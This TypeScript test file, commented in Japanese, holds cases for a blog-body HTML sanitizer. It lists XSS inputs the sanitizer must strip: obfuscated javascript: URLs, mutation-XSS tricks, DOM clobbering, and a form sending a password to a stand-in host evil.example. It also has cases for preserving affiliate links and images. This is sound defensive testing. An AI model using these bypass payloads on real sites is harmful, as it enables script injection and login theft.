/**
 * 本文 HTML のサニタイズのテストケース（docs/sanitize-policy.md に対応）。
 * 実装（PR 2）のテストがすべて実行する。この一覧の変更・削除は人の承認が必要（CODEOWNERS）。
 *
 * 判定のしかた（テスト側で行う）
 * - mustNotContain：出力を小文字にした文字列に、どれも含まれないこと
 * - mustContain：出力に、どれもそのまま含まれること（大文字・小文字も区別する）
 */
export interface SanitizeCase {
  /** ケースの説明（テスト名になる） */
  name: string;
  input: string;
  mustNotContain: string[];
  mustContain?: string[];
}

/** 無害化されるべき入力（攻撃や、許可しない要素・属性） */
export const UNSAFE_CASES: SanitizeCase[] = [
  // 要素
  {
    name: 'script 要素は中身ごと消す',
    input: '<p>前</p><script>alert(1)</script><p>後</p>',
    mustNotContain: ['<script', 'alert(1)'],
    mustContain: ['前', '後'],
  },
  {
    name: '大文字や属性付きの script も消す',
    input: '<SCRIPT type="text/javascript" src="https://evil.example/x.js"></SCRIPT><p>本文</p>',
    mustNotContain: ['<script', 'evil.example'],
    mustContain: ['本文'],
  },
  {
    name: 'style 要素は中身ごと消す',
    input: '<style>body{display:none}</style><p>本文</p>',
    mustNotContain: ['<style', 'display:none'],
    mustContain: ['本文'],
  },
  {
    name: 'iframe は消す（srcdoc を含む）',
    input: '<iframe src="https://evil.example/"></iframe><iframe srcdoc="<script>alert(1)</script>"></iframe>',
    mustNotContain: ['<iframe', 'srcdoc', 'evil.example', 'alert(1)'],
  },
  {
    name: 'object・embed は消す',
    input: '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">',
    mustNotContain: ['<object', '<embed', 'evil.example'],
  },
  {
    name: 'form と入力要素は消し、formaction も残さない',
    input:
      '<form action="https://evil.example/steal"><input name="password"><button formaction="javascript:alert(1)">送信</button></form>',
    mustNotContain: ['<form', '<input', '<button', 'formaction', 'javascript:', 'evil.example'],
  },
  {
    name: 'meta refresh は消す',
    input: '<meta http-equiv="refresh" content="0;url=https://evil.example/"><p>本文</p>',
    mustNotContain: ['<meta', 'evil.example'],
    mustContain: ['本文'],
  },
  {
    name: 'base は消す（相対 URL の解決先を書き換えさせない）',
    input: '<base href="https://evil.example/"><p>本文</p>',
    mustNotContain: ['<base', 'evil.example'],
  },
  {
    name: 'link は消す',
    input: '<link rel="stylesheet" href="https://evil.example/x.css"><p>本文</p>',
    mustNotContain: ['<link', 'evil.example'],
  },
  {
    name: 'svg は中身ごと消す（onload・script を含む）',
    input: '<svg onload="alert(1)"><script>alert(2)</script></svg><p>本文</p>',
    mustNotContain: ['<svg', 'onload', 'alert('],
    mustContain: ['本文'],
  },
  {
    name: 'math と xlink:href は消す',
    input: '<math><maction xlink:href="javascript:alert(1)">x</maction></math>',
    mustNotContain: ['<math', 'xlink', 'javascript:'],
  },
  {
    name: 'template は中身ごと消す',
    input: '<template><img src="https://evil.example/x" onerror="alert(1)"></template><p>本文</p>',
    mustNotContain: ['<template', 'onerror', 'alert(1)'],
    mustContain: ['本文'],
  },

  // イベント属性・style 属性
  {
    name: 'img の onerror を消す（src が https でなければ img ごと消す）',
    input: '<img src=x onerror="alert(1)">',
    mustNotContain: ['onerror', 'alert(1)', '<img'],
  },
  {
    name: '許可したタグのイベント属性を消す',
    input: '<p onclick="alert(1)" onmouseover="alert(2)">本文</p>',
    mustNotContain: ['onclick', 'onmouseover', 'alert('],
    mustContain: ['本文'],
  },
  {
    name: '未知の要素はタグとイベント属性を消し、テキストは残す',
    input: '<x-widget onclick="alert(1)">テキスト</x-widget>',
    mustNotContain: ['<x-widget', 'onclick', 'alert(1)'],
    mustContain: ['テキスト'],
  },
  {
    name: 'style 属性を消す',
    input: '<p style="background:url(javascript:alert(1))">本文</p>',
    mustNotContain: ['style=', 'javascript:', 'alert(1)'],
    mustContain: ['本文'],
  },
  {
    name: 'class 属性を消す（サイトの CSS を勝手に当てさせない）',
    input: '<p class="admin-only">本文</p>',
    mustNotContain: ['class='],
    mustContain: ['本文'],
  },

  // URL
  {
    name: 'javascript: の href を消す',
    input: '<a href="javascript:alert(1)">リンク</a>',
    mustNotContain: ['javascript:', 'alert(1)', 'href='],
    mustContain: ['リンク'],
  },
  {
    name: '大文字の JavaScript: も消す',
    input: '<a href="JaVaScRiPt:alert(1)">リンク</a>',
    mustNotContain: ['javascript:', 'href='],
  },
  {
    name: '前の空白や改行で隠した javascript: も消す',
    input: '<a href="  \n javascript:alert(1)">リンク</a>',
    mustNotContain: ['javascript:', 'href='],
  },
  {
    name: 'タブ・改行を混ぜた javascript: も消す',
    input: '<a href="java\tscript:alert(1)">1</a><a href="java\nscript:alert(1)">2</a>',
    mustNotContain: ['script:', 'href='],
  },
  {
    name: '10進の実体参照で隠した javascript: も消す',
    input: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">リンク</a>',
    mustNotContain: ['href=', 'alert(1)'],
  },
  {
    name: '16進の実体参照で隠した javascript: も消す',
    input: '<a href="&#x6A;avascript&#x3A;alert(1)">リンク</a>',
    mustNotContain: ['href=', 'alert(1)'],
  },
  {
    name: '実体参照のタブを混ぜた javascript: も消す',
    input: '<a href="java&#x09;script:alert(1)">リンク</a>',
    mustNotContain: ['href=', 'alert(1)'],
  },
  {
    name: 'data: の href を消す',
    input: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">リンク</a>',
    mustNotContain: ['data:', 'href='],
  },
  {
    name: 'vbscript: の href を消す',
    input: '<a href="vbscript:msgbox(1)">リンク</a>',
    mustNotContain: ['vbscript:', 'href='],
  },
  {
    name: '相対 URL・プロトコル相対 URL の href を消す',
    input: '<a href="/admin">1</a><a href="//evil.example/">2</a>',
    mustNotContain: ['href=', 'evil.example'],
  },
  {
    name: 'http の画像は img ごと消す（https のみ許可）',
    input: '<img src="http://evil.example/x.png" alt="">',
    mustNotContain: ['<img', 'evil.example'],
  },
  {
    name: 'プロトコル相対 URL の画像は img ごと消す',
    input: '<img src="//evil.example/x.png" alt="">',
    mustNotContain: ['<img', 'evil.example'],
  },
  {
    name: 'https でも assets.st-note.com 以外の画像は img ごと消す',
    input: '<img src="https://evil.example/x.png" alt="">',
    mustNotContain: ['<img', 'evil.example'],
  },
  {
    name: 'assets.st-note.com に似せたホストの画像は img ごと消す',
    input:
      '<img src="https://assets.st-note.com.evil.example/x.png" alt=""><img src="https://assets.st-note.com@evil.example/x.png" alt="">',
    mustNotContain: ['<img', 'evil.example'],
  },
  {
    name: 'srcset を消す（src 以外から読み込ませない）',
    input: '<img src="https://assets.st-note.com/img/a.png" srcset="https://evil.example/x.png 2x" alt="">',
    mustNotContain: ['srcset', 'evil.example'],
    mustContain: ['https://assets.st-note.com/img/a.png'],
  },
  {
    name: '埋め込みの data-src が https でなければ残さない',
    input: '<figure embedded-service="note" embedded-content-key="emb1" data-src="javascript:alert(1)"></figure>',
    mustNotContain: ['javascript:', 'alert(1)', 'data-src'],
  },

  // パーサーの解釈のずれを使う攻撃
  {
    name: '属性値を閉じて抜け出す入力',
    input: '<a href="https://example.com/"><script>alert(1)</script>">リンク</a>',
    mustNotContain: ['<script', 'alert(1)'],
  },
  {
    name: 'コメントを使って抜け出す入力',
    input: '<!--><script>alert(1)</script>--><p>本文</p>',
    mustNotContain: ['<script', 'alert(1)'],
  },
  {
    name: 'noscript を使った mutation XSS',
    input: '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
    mustNotContain: ['onerror', 'alert(1)', '<noscript'],
  },
  {
    name: 'noembed は中身ごと消す（#47）',
    input: '<noembed>隠す文字<img src=x onerror=alert(1)></noembed><p>本文</p>',
    mustNotContain: ['<noembed', '隠す文字', 'onerror'],
    mustContain: ['<p>本文</p>'],
  },
  {
    name: 'noframes は中身ごと消す（#47）',
    input: '<noframes>隠す文字<img src=x onerror=alert(1)></noframes><p>本文</p>',
    mustNotContain: ['<noframes', '隠す文字', 'onerror'],
    mustContain: ['<p>本文</p>'],
  },
  {
    name: '外部画像だけのリンクはタグごと消し、空のリンクを残さない（#47）',
    input:
      '<figure embedded-service="external-article" embedded-content-key="emb8df5db980187" data-src="https://www.amazon.co.jp/dp/B0GCQWRYBG"><a href="https://www.amazon.co.jp/dp/B0GCQWRYBG" target="_blank"><strong>商品名</strong></a><a href="https://www.amazon.co.jp/dp/B0GCQWRYBG" target="_blank">\n<img src="https://m.media-amazon.com/images/I/x.jpg">\n</a><a href="https://example.com/"> </a></figure>',
    mustNotContain: ['media-amazon', '"></a>', '">\n\n</a>', '"> </a>'],
    mustContain: ['<strong>商品名</strong></a>'],
  },
  {
    name: 'textarea を使った mutation XSS',
    input: '<textarea><p title="</textarea><img src=x onerror=alert(1)>"></textarea>',
    mustNotContain: ['onerror', 'alert(1)', '<textarea'],
  },
  {
    name: 'title 属性の中の HTML は実行されない形で残る',
    input: '<p title="&lt;img src=x onerror=alert(1)&gt;">本文</p>',
    mustNotContain: ['<img', 'title='],
    mustContain: ['本文'],
  },

  // DOM clobbering
  {
    name: 'id には nbk- を付け、グローバル変数を上書きさせない',
    input: '<p id="location">本文</p><h2 id="cookie">見出し</h2>',
    mustNotContain: ['id="location"', 'id="cookie"'],
    mustContain: ['id="nbk-location"', 'id="nbk-cookie"'],
  },
  {
    name: 'name 属性は消す',
    input: '<p name="getElementById">本文</p>',
    mustNotContain: ['name='],
    mustContain: ['本文'],
  },
];

/** 残すべき入力（fixture の本文から取った形） */
export const PRESERVE_CASES: SanitizeCase[] = [
  {
    name: 'アフィリエイトリンクの href（クエリと &amp;）を壊さない',
    input:
      '<a href="https://www.amazon.co.jp/dp/B0GCQWRYBG?tag=ludyworks-gift-22&amp;linkCode=ogi&amp;th=1&amp;psc=1&amp;language=ja_JP" rel="nofollow noopener" target="_blank"><strong>商品名</strong></a>',
    mustNotContain: ['rel="nofollow noopener"'],
    mustContain: [
      'href="https://www.amazon.co.jp/dp/B0GCQWRYBG?tag=ludyworks-gift-22&amp;linkCode=ogi&amp;th=1&amp;psc=1&amp;language=ja_JP"',
      'target="_blank"',
      'rel="nofollow noopener noreferrer sponsored"',
      '<strong>商品名</strong>',
    ],
  },
  {
    name: 'アフィリエイトでない target="_blank" のリンクには sponsored を付けない',
    input: '<a href="https://example.com/page" rel="nofollow noopener" target="_blank">リンク</a>',
    mustNotContain: ['sponsored'],
    mustContain: ['target="_blank"', 'rel="nofollow noopener noreferrer"'],
  },
  {
    name: 'tag のない Amazon のリンクはアフィリエイトとみなさない',
    input: '<a href="https://www.amazon.co.jp/dp/B0GCQWRYBG">リンク</a>',
    mustNotContain: ['sponsored', 'rel='],
    mustContain: ['href="https://www.amazon.co.jp/dp/B0GCQWRYBG"'],
  },
  {
    name: 'Amazon の短縮 URL は target がなくても sponsored を付ける',
    input: '<a href="https://amzn.to/3AbCdEf">リンク</a>',
    mustNotContain: ['nofollow'],
    mustContain: ['href="https://amzn.to/3AbCdEf"', 'rel="sponsored"'],
  },
  {
    name: '一覧にあるアフィリエイトのサービス（もしも・楽天・A8・バリューコマース）に sponsored を付ける',
    input:
      '<a href="https://af.moshimo.com/af/c/click?a_id=1">1</a><a href="https://hb.afl.rakuten.co.jp/hgc/x/">2</a><a href="https://px.a8.net/svt/ejp?a8mat=x">3</a><a href="https://ck.jp.ap.valuecommerce.com/servlet/referral?sid=1">4</a>',
    mustNotContain: [],
    mustContain: [
      'href="https://af.moshimo.com/af/c/click?a_id=1" rel="sponsored"',
      'href="https://hb.afl.rakuten.co.jp/hgc/x/" rel="sponsored"',
      'href="https://px.a8.net/svt/ejp?a8mat=x" rel="sponsored"',
      'href="https://ck.jp.ap.valuecommerce.com/servlet/referral?sid=1" rel="sponsored"',
    ],
  },
  {
    name: 'アフィリエイトのホストに似せた URL は sponsored の対象外',
    input: '<a href="https://amazon.co.jp.evil.example/?tag=x">リンク</a>',
    mustNotContain: ['sponsored'],
  },
  {
    name: 'target のない https のリンクは rel を付けずに残す',
    input: '<a href="https://example.com/page">リンク</a>',
    mustNotContain: ['target=', 'rel='],
    mustContain: ['<a href="https://example.com/page">リンク</a>'],
  },
  {
    name: 'mailto のリンクは残す',
    input: '<a href="mailto:hello@example.com">メール</a>',
    mustNotContain: [],
    mustContain: ['href="mailto:hello@example.com"'],
  },
  {
    name: 'note の画像は属性を残し、lazy loading を付ける',
    input:
      '<figure name="e2889f1b-c3c6-43cb-af47-79e52f0a8284" id="e2889f1b-c3c6-43cb-af47-79e52f0a8284"><img src="https://assets.st-note.com/img/1794443409-8XWJIext964kZPqfoBEOg3bn.png" alt="" width="620" height="227"><figcaption></figcaption></figure>',
    mustNotContain: ['name='],
    mustContain: [
      'id="nbk-e2889f1b-c3c6-43cb-af47-79e52f0a8284"',
      'src="https://assets.st-note.com/img/1794443409-8XWJIext964kZPqfoBEOg3bn.png"',
      'width="620"',
      'height="227"',
      'loading="lazy"',
      'decoding="async"',
      '<figcaption>',
    ],
  },
  {
    name: '数字でない width・height は消す',
    input: '<img src="https://assets.st-note.com/img/a.png" alt="a" width="100%" height="auto">',
    mustNotContain: ['width=', 'height='],
    mustContain: ['alt="a"'],
  },
  {
    name: '見出しの id は nbk- を付けて残し、name は消す',
    input: '<h3 name="5bf2a080-2df1-423b-a0c1-37751fc7576c" id="5bf2a080-2df1-423b-a0c1-37751fc7576c">選ぶ基準</h3>',
    mustNotContain: ['name='],
    mustContain: ['<h3 id="nbk-5bf2a080-2df1-423b-a0c1-37751fc7576c">選ぶ基準</h3>'],
  },
  {
    name: 'note の埋め込みの figure は属性の名前を変えて残す',
    input:
      '<figure name="8b591736-6cc1-486a-b1b8-d1e9171e5ca7" id="8b591736-6cc1-486a-b1b8-d1e9171e5ca7" data-src="https://note.com/kida_lw/n/n139dd4425bd8" data-identifier="n139dd4425bd8" embedded-service="note" embedded-content-key="emb6e4a8d7c1346"> </figure>',
    mustNotContain: ['embedded-service=', 'embedded-content-key=', 'data-src=', 'data-identifier', 'name='],
    mustContain: [
      'data-nbk-embed-service="note"',
      'data-nbk-embed-key="emb6e4a8d7c1346"',
      'data-nbk-embed-url="https://note.com/kida_lw/n/n139dd4425bd8"',
      'id="nbk-8b591736-6cc1-486a-b1b8-d1e9171e5ca7"',
    ],
  },
  {
    name: '外部記事の埋め込みは中のリンクカードを残す',
    input:
      '<figure embedded-service="external-article" embedded-content-key="emb8df5db980187" data-src="https://www.amazon.co.jp/dp/B0GCQWRYBG"><a href="https://www.amazon.co.jp/dp/B0GCQWRYBG?tag=ludyworks-gift-22" rel="nofollow noopener" target="_blank"><strong>商品名</strong><em>6,620円</em></a></figure>',
    mustNotContain: ['embedded-service='],
    mustContain: [
      'data-nbk-embed-service="external-article"',
      'href="https://www.amazon.co.jp/dp/B0GCQWRYBG?tag=ludyworks-gift-22"',
      'rel="nofollow noopener noreferrer sponsored"',
      '<strong>商品名</strong>',
      '<em>6,620円</em>',
    ],
  },
  {
    name: 'table-of-contents は目次の目印に置き換える',
    input:
      '<table-of-contents name="b0bce132-7c3b-44df-9923-342d76d9583c" id="b0bce132-7c3b-44df-9923-342d76d9583c"><br></table-of-contents>',
    mustNotContain: ['<table-of-contents'],
    mustContain: ['<div data-nbk-toc></div>'],
  },
  {
    name: '引用・リスト・強調などの基本の要素を残す',
    input:
      '<blockquote><p>引用</p></blockquote><ul><li><strong>強調</strong></li><li><em>斜体</em></li></ul><ol><li>1つ目<br>改行</li></ol>',
    mustNotContain: [],
    mustContain: [
      '<blockquote><p>引用</p></blockquote>',
      '<ul><li><strong>強調</strong></li><li><em>斜体</em></li></ul>',
      '<ol><li>1つ目<br />改行</li></ol>',
    ],
  },
  {
    name: 'コードブロック・区切り線・h4・取り消し線を残す（決定事項 1）',
    input: '<h4>小見出し</h4><pre><code>const a = 1 &lt; 2;</code></pre><hr><p><s>取り消し</s></p>',
    mustNotContain: [],
    mustContain: ['<h4>小見出し</h4>', '<pre><code>const a = 1 &lt; 2;</code></pre>', '<hr />', '<s>取り消し</s>'],
  },
  {
    name: '表を残し、数字の colspan・rowspan だけ残す（決定事項 1）',
    input:
      '<table><thead><tr><th colspan="2">見出し</th></tr></thead><tbody><tr><td rowspan="1">A</td><td colspan="x" style="color:red">B</td></tr></tbody></table>',
    mustNotContain: ['colspan="x"', 'style='],
    mustContain: ['<table><thead><tr><th colspan="2">見出し</th></tr></thead>', '<td rowspan="1">A</td>', '<td>B</td>'],
  },
  {
    name: '許可しない要素はタグだけ消して文字を残す',
    input: '<p><span>文字</span><font color="red">赤</font></p>',
    mustNotContain: ['<span', '<font', 'color='],
    mustContain: ['<p>文字赤</p>'],
  },
  {
    name: '許可する画像だけのリンクは残す（#47）',
    input: '<p><a href="https://example.com/"><img src="https://assets.st-note.com/img/a.png" alt="説明"></a></p>',
    mustNotContain: [],
    mustContain: ['<a href="https://example.com/"><img src="https://assets.st-note.com/img/a.png" alt="説明"'],
  },
];
